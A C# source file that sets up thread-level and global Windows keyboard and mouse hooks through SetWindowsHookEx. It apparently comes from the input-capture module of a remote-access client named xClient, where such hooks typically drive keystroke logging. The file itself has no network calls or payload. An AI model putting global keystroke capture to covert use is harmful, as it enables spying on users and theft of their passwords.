using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Runtime.InteropServices;
using xClient.Core.MouseKeyHook.Implementation;

namespace xClient.Core.MouseKeyHook.WinApi;

internal static class HookHelper
{
	public static HookResult HookAppMouse(Callback callback)
	{
		return HookApp(7, callback);
	}

	public static HookResult HookAppKeyboard(Callback callback)
	{
		return HookApp(2, callback);
	}

	public static HookResult HookGlobalMouse(Callback callback)
	{
		return HookGlobal(14, callback);
	}

	public static HookResult HookGlobalKeyboard(Callback callback)
	{
		return HookGlobal(13, callback);
	}

	private static HookResult HookApp(int hookId, Callback callback)
	{
		HookProcedure hookProcedure = (int code, IntPtr param, IntPtr lParam) => HookProcedure(code, param, lParam, callback);
		HookProcedureHandle hookProcedureHandle = HookNativeMethods.SetWindowsHookEx(hookId, hookProcedure, IntPtr.Zero, ThreadNativeMethods.GetCurrentThreadId());
		if (hookProcedureHandle.IsInvalid)
		{
			ThrowLastUnmanagedErrorAsException();
		}
		return new HookResult(hookProcedureHandle, hookProcedure);
	}

	private static HookResult HookGlobal(int hookId, Callback callback)
	{
		HookProcedure hookProcedure = (int code, IntPtr param, IntPtr lParam) => HookProcedure(code, param, lParam, callback);
		HookProcedureHandle hookProcedureHandle = HookNativeMethods.SetWindowsHookEx(hookId, hookProcedure, Process.GetCurrentProcess().MainModule!.BaseAddress, 0);
		if (hookProcedureHandle.IsInvalid)
		{
			ThrowLastUnmanagedErrorAsException();
		}
		return new HookResult(hookProcedureHandle, hookProcedure);
	}

	private static IntPtr HookProcedure(int nCode, IntPtr wParam, IntPtr lParam, Callback callback)
	{
		if (nCode != 0)
		{
			return CallNextHookEx(nCode, wParam, lParam);
		}
		CallbackData data = new CallbackData(wParam, lParam);
		if (!callback(data))
		{
			return new IntPtr(-1);
		}
		return CallNextHookEx(nCode, wParam, lParam);
	}

	private static IntPtr CallNextHookEx(int nCode, IntPtr wParam, IntPtr lParam)
	{
		return HookNativeMethods.CallNextHookEx(IntPtr.Zero, nCode, wParam, lParam);
	}

	private static void ThrowLastUnmanagedErrorAsException()
	{
		throw new Win32Exception(Marshal.GetLastWin32Error());
	}
}
